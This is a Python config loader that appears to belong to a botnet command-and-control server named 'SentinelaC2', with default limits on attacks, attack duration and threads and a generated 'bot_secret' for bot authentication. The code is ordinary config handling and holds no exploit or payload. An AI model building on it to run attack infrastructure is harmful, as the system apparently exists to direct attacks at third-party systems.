import json
import os
import base64
import secrets
import logging

CONFIG_PATH = os.path.join(os.path.dirname(__file__), 'config.json')

def configs():
    default_config = {
        "server": {
            "name": "SentinelaC2",
            "host": "0.0.0.0",
            "port": 1337
        },
        "global_limits": {
            "max_attacks": 200,
            "max_time": 1300,
            "min_time": 10,
            "threads": 10
        }
    }
    
    try:
        if not os.path.exists(CONFIG_PATH):
            logging.warning(f"Config file not found at {CONFIG_PATH}, creating default config")
            try:
                with open(CONFIG_PATH, 'w') as f:
                    json.dump(default_config, f, indent=2)
            except Exception as e:
                logging.error(f"Could not create config file: {e}")
            return default_config
        
        with open(CONFIG_PATH, 'r', encoding='utf-8') as f:
            config = json.load(f)
        
        if not isinstance(config, dict):
            logging.error("Invalid config file format, using defaults")
            return default_config
        
        if 'server' not in config:
            config['server'] = default_config['server']
        else:
            for key in default_config['server']:
                if key not in config['server']:
                    config['server'][key] = default_config['server'][key]
        
        if 'global_limits' not in config:
            config['global_limits'] = default_config['global_limits']
        else:
            for key in default_config['global_limits']:
                if key not in config['global_limits']:
                    config['global_limits'][key] = default_config['global_limits'][key]
        
        if 'bot_secret' not in config:
            bot_secret_bytes = secrets.token_bytes(32)
            bot_secret_b64 = base64.b64encode(bot_secret_bytes).decode('utf-8')
            config['bot_secret'] = bot_secret_b64
            try:
                with open(CONFIG_PATH, 'w', encoding='utf-8') as f:
                    json.dump(config, f, indent=2, ensure_ascii=False)
                logging.info("Generated and saved bot_secret to config")
            except Exception as e:
                logging.warning(f"Could not save bot_secret to config: {e}")
        
        return config
    except json.JSONDecodeError as e:
        logging.error(f"Invalid JSON in config file: {e}, using defaults")
        return default_config
    except PermissionError as e:
        logging.error(f"Permission denied accessing config file: {e}, using defaults")
        return default_config
    except Exception as e:
        logging.error(f"Error loading config: {e}, using defaults")
        return default_config
    